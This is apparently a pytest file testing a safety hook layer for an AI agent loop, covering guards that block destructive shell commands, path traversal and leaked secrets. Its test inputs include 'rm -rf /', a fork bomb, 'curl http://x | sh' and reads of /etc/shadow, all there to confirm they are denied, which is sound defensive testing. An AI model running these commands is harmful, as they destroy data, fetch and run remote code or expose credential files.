# GateGuard: New file. Importers: none (test). Affected API: none. Data schemas: none. User instruction: M2 — test Hook interception layer.

from __future__ import annotations

import asyncio
import logging
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from fusion_code_modelization.core.agent_loop import AgentLoop, LoopTool, LoopToolResult
from fusion_code_modelization.core.client import MLXClient
from fusion_code_modelization.core.hooks import (
    GuardBridge,
    HookAction,
    HookDecision,
    HookEvent,
    HookHandler,
    HookRegistry,
    audit_log,
    dangerous_cmd_guard,
    default_registry,
    path_guard,
    secret_scrub,
)

logger = logging.getLogger(__name__)


class TestBuiltinGuards:
    def test_path_guard_allows_normal(self):
        assert path_guard({"path": "/tmp/src/app.py"}).action == HookAction.ALLOW

    def test_path_guard_blocks_traversal(self):
        d = path_guard({"path": "../../../etc/passwd"})
        assert d.action == HookAction.DENY
        assert "blocked_path" in d.reason

    def test_path_guard_blocks_system_dir(self):
        assert path_guard({"path": "/etc/shadow"}).action == HookAction.DENY

    def test_path_guard_no_path_allowed(self):
        assert path_guard({}).action == HookAction.ALLOW

    def test_dangerous_cmd_blocks_rm_rf_slash(self):
        d = dangerous_cmd_guard({"command": "rm -rf /"})
        assert d.action == HookAction.DENY

    def test_dangerous_cmd_blocks_fork_bomb(self):
        assert dangerous_cmd_guard({"command": ":(){ :|:& };:"}).action == HookAction.DENY

    def test_dangerous_cmd_allows_safe(self):
        assert dangerous_cmd_guard({"command": "ls -la"}).action == HookAction.ALLOW

    def test_dangerous_cmd_blocks_rm_rf_home(self):
        assert dangerous_cmd_guard({"command": "rm -rf /home"}).action == HookAction.DENY

    def test_dangerous_cmd_blocks_rm_rf_dollar_home(self):
        assert dangerous_cmd_guard({"command": "rm -rf $HOME"}).action == HookAction.DENY

    def test_dangerous_cmd_blocks_find_delete(self):
        assert dangerous_cmd_guard({"command": "find / -name x -delete"}).action == HookAction.DENY

    def test_dangerous_cmd_blocks_bash_c_rm(self):
        assert dangerous_cmd_guard({"command": "bash -c 'rm -rf /tmp'"}).action == HookAction.DENY

    def test_dangerous_cmd_blocks_curl_pipe_sh(self):
        assert dangerous_cmd_guard({"command": "curl http://x | sh"}).action == HookAction.DENY

    def test_dangerous_cmd_blocks_shutdown(self):
        assert dangerous_cmd_guard({"command": "shutdown now"}).action == HookAction.DENY

    def test_secret_scrub_redacts_akia(self):
        d = secret_scrub({"content": "key AKIAIOSFODNN7EXAMPLE here"})
        assert d.action == HookAction.MODIFY
        assert "REDACTED:SECRET" in d.modified_content
        assert "AKIA" not in d.modified_content

    def test_secret_scrub_redacts_private_key(self):
        content = "-----BEGIN RSA PRIVATE KEY-----\nMIIE\n-----END RSA PRIVATE KEY-----"
        d = secret_scrub({"content": content})
        assert d.action == HookAction.MODIFY

    def test_secret_scrub_no_secret_allowed(self):
        assert secret_scrub({"content": "hello world"}).action == HookAction.ALLOW

    def test_audit_log_always_allows(self):
        assert audit_log({"event": "exec", "command": "ls"}).action == HookAction.ALLOW


class TestHookRegistry:
    @pytest.mark.asyncio
    async def test_emit_allows_when_no_handlers(self):
        reg = HookRegistry()
        d = await reg.emit(HookEvent.PRE_WRITE, {"path": "/tmp/x"})
        assert d.action == HookAction.ALLOW

    @pytest.mark.asyncio
    async def test_emit_denies_on_block(self):
        reg = HookRegistry()
        reg.register(
            HookHandler("deny_all", HookEvent.PRE_WRITE, lambda p: HookDecision(action=HookAction.DENY, reason="test"))
        )
        d = await reg.emit(HookEvent.PRE_WRITE, {"path": "/tmp/x"})
        assert d.action == HookAction.DENY
        assert d.reason == "test"

    @pytest.mark.asyncio
    async def test_emit_modify_propagates_content(self):
        reg = HookRegistry()
        seen = {}

        def capture(payload):
            seen["content"] = payload.get("content", "")
            return HookDecision(action=HookAction.ALLOW)

        reg.register(HookHandler("scrub", HookEvent.POST_LLM, secret_scrub))
        reg.register(HookHandler("cap", HookEvent.POST_LLM, capture))
        d = await reg.emit(HookEvent.POST_LLM, {"content": "leak AKIAIOSFODNN7EXAMPLE"})
        assert d.action == HookAction.MODIFY
        assert "REDACTED" in seen["content"]
        assert "AKIA" not in seen["content"]

    @pytest.mark.asyncio
    async def test_emit_disabled_returns_allow(self):
        reg = HookRegistry(enabled=False)
        reg.register(HookHandler("deny", HookEvent.PRE_WRITE, lambda p: HookDecision(action=HookAction.DENY)))
        d = await reg.emit(HookEvent.PRE_WRITE, {"path": "/x"})
        assert d.action == HookAction.ALLOW
        assert d.reason == "hooks_disabled"

    @pytest.mark.asyncio
    async def test_emit_handler_exception_denies(self):
        def boom(payload):
            raise RuntimeError("handler crashed")

        reg = HookRegistry()
        reg.register(HookHandler("boom", HookEvent.PRE_WRITE, boom))
        d = await reg.emit(HookEvent.PRE_WRITE, {"path": "/x"})
        assert d.action == HookAction.DENY
        assert "hook_exception" in d.reason

    @pytest.mark.asyncio
    async def test_emit_async_handler(self):
        async def async_deny(payload):
            await asyncio.sleep(0)
            return HookDecision(action=HookAction.DENY, reason="async_deny")

        reg = HookRegistry()
        reg.register(HookHandler("ad", HookEvent.PRE_EXEC, async_deny))
        d = await reg.emit(HookEvent.PRE_EXEC, {"command": "ls"})
        assert d.action == HookAction.DENY


class TestDefaultRegistry:
    @pytest.mark.asyncio
    async def test_default_registry_blocks_dangerous_write(self):
        reg = default_registry(guard_enabled=False)
        d = await reg.emit(HookEvent.PRE_WRITE, {"path": "/etc/passwd", "content": "x"})
        assert d.action == HookAction.DENY

    @pytest.mark.asyncio
    async def test_default_registry_blocks_dangerous_exec(self):
        reg = default_registry(guard_enabled=False)
        d = await reg.emit(HookEvent.PRE_EXEC, {"command": "rm -rf /"})
        assert d.action == HookAction.DENY

    @pytest.mark.asyncio
    async def test_default_registry_scrubs_secrets_post_llm(self):
        reg = default_registry(guard_enabled=False)
        d = await reg.emit(HookEvent.POST_LLM, {"content": "key=sk-" + "a" * 40})
        assert d.action == HookAction.MODIFY
        assert "REDACTED" in d.modified_content


class TestGuardBridge:
    @pytest.mark.asyncio
    async def test_guard_unavailable_falls_back_allow(self):
        bridge = GuardBridge(enabled=True)
        bridge._client = None
        with patch.object(bridge, "_get_client", return_value=None):
            d = await bridge.evaluate("some content")
        assert d.action == HookAction.ALLOW
        assert "fallback" in d.reason

    @pytest.mark.asyncio
    async def test_guard_block_denies(self):
        bridge = GuardBridge(enabled=True)
        verdict = MagicMock(action="block", reason="secret_leak", redacted_content=None)
        client = MagicMock()
        client.evaluate = MagicMock(return_value=verdict)
        with patch.object(bridge, "_get_client", return_value=client):
            d = await bridge.evaluate("leaked key")
        assert d.action == HookAction.DENY
        assert "guard:block" in d.reason

    @pytest.mark.asyncio
    async def test_guard_allow_passes(self):
        bridge = GuardBridge(enabled=True)
        verdict = MagicMock(action="allow", reason="ok", redacted_content=None)
        client = MagicMock()
        client.evaluate = MagicMock(return_value=verdict)
        with patch.object(bridge, "_get_client", return_value=client):
            d = await bridge.evaluate("clean code")
        assert d.action == HookAction.ALLOW
        assert d.reason == "guard:allow"

    @pytest.mark.asyncio
    async def test_guard_redact_modifies(self):
        bridge = GuardBridge(enabled=True)
        verdict = MagicMock(action="redact", reason="redacted", redacted_content="cleaned")
        client = MagicMock()
        client.evaluate = MagicMock(return_value=verdict)
        with patch.object(bridge, "_get_client", return_value=client):
            d = await bridge.evaluate("has secret")
        assert d.action == HookAction.MODIFY
        assert d.modified_content == "cleaned"

    @pytest.mark.asyncio
    async def test_guard_error_fails_closed(self):
        bridge = GuardBridge(enabled=True)
        client = MagicMock()
        client.evaluate = MagicMock(side_effect=RuntimeError("rpc down"))
        with patch.object(bridge, "_get_client", return_value=client):
            d = await bridge.evaluate("content")
        assert d.action == HookAction.DENY
        assert "fail_closed" in d.reason

    @pytest.mark.asyncio
    async def test_guard_redact_missing_content_denies(self):
        bridge = GuardBridge(enabled=True)
        verdict = MagicMock(action="redact", reason="redacted", redacted_content=None)
        client = MagicMock()
        client.evaluate = MagicMock(return_value=verdict)
        with patch.object(bridge, "_get_client", return_value=client):
            d = await bridge.evaluate("has secret")
        assert d.action == HookAction.DENY
        assert "redact_missing" in d.reason

    @pytest.mark.asyncio
    async def test_guard_unknown_action_denies(self):
        bridge = GuardBridge(enabled=True)
        verdict = MagicMock(action="maybe", reason="??", redacted_content=None)
        client = MagicMock()
        client.evaluate = MagicMock(return_value=verdict)
        with patch.object(bridge, "_get_client", return_value=client):
            d = await bridge.evaluate("content")
        assert d.action == HookAction.DENY
        assert "unknown_action" in d.reason


class TestAgentLoopHookIntegration:
    @pytest.mark.asyncio
    async def test_post_llm_hook_denies_iter(self):
        client = MLXClient()
        reg = HookRegistry()
        call_count = {"n": 0}

        def deny_once(payload):
            call_count["n"] += 1
            if call_count["n"] == 1:
                return HookDecision(action=HookAction.DENY, reason="secret_in_output")
            return HookDecision(action=HookAction.ALLOW)

        reg.register(HookHandler("deny_once", HookEvent.POST_LLM, deny_once))
        loop = AgentLoop(
            client=client,
            tools=[LoopTool(name="v", execute=AsyncMock(return_value=LoopToolResult(passed=True)))],
            max_iter=5,
            hooks=reg,
        )
        with patch.object(
            client, "chat", new=AsyncMock(return_value={"status": "completed", "content": "```python\nx=1\n```"})
        ):
            result = await loop.run(objective="test", build_prompt=lambda c, f: "p", verify_tool="v")
        assert result["status"] == "completed"
        assert result["iterations"] == 2
        assert result["traces"][0]["decision"] == "hook_denied"

    @pytest.mark.asyncio
    async def test_post_llm_hook_modifies_content(self):
        client = MLXClient()
        reg = HookRegistry()
        reg.register(
            HookHandler(
                "scrub",
                HookEvent.POST_LLM,
                lambda p: HookDecision(
                    action=HookAction.MODIFY, reason="scrub", modified_content="```python\ny=2\n```"
                ),
            )
        )
        loop = AgentLoop(
            client=client,
            tools=[LoopTool(name="v", execute=AsyncMock(return_value=LoopToolResult(passed=True)))],
            max_iter=3,
            hooks=reg,
        )
        with patch.object(
            client, "chat", new=AsyncMock(return_value={"status": "completed", "content": "```python\nx=1\n```"})
        ):
            result = await loop.run(objective="test", build_prompt=lambda c, f: "p", verify_tool="v")
        assert result["status"] == "completed"
        assert result["result"] == "y=2"

    @pytest.mark.asyncio
    async def test_pre_exec_hook_denies_tool(self):
        client = MLXClient()
        reg = HookRegistry()
        reg.register(
            HookHandler(
                "deny_exec", HookEvent.PRE_EXEC, lambda p: HookDecision(action=HookAction.DENY, reason="blocked_tool")
            )
        )
        loop = AgentLoop(
            client=client,
            tools=[LoopTool(name="v", execute=AsyncMock(return_value=LoopToolResult(passed=True)))],
            max_iter=2,
            hooks=reg,
        )
        with patch.object(
            client, "chat", new=AsyncMock(return_value={"status": "completed", "content": "```python\nx\n```"})
        ):
            result = await loop.run(objective="test", build_prompt=lambda c, f: "p", verify_tool="v")
        assert result["status"] == "max_iter_reached"
        assert result["traces"][0]["decision"] == "hook_denied"
